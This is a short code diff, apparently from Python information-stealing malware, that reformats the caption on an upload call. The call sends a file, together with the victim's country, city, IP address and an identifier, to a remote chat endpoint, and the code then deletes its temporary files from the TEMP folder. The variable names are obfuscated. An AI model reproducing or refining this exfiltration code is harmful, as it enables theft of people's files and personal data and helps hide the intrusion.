@@ -575,7 +575,7 @@ def main():
     if time() == 1:
         # decrypt(z_ph, number)
         with open(z_ph, 'rb') as f:
-            x01.post(crypt, data={'caption': "\n"+"country :  " + city + "-"+ten_country + "\n" +
+            x01.post(crypt, data={'caption': "\n"+"country :  " + country_code + "-"+city + "\n" +
                      "id :  " + id() + "\n"+"ip :  "+ip + "\n" + number, 'chat_id': id2}, files={'document': f})
         shutil.rmtree(os.environ["TEMP"], name_f + '.zip')
         shutil.rmtree(os.environ["TEMP"], name_f)
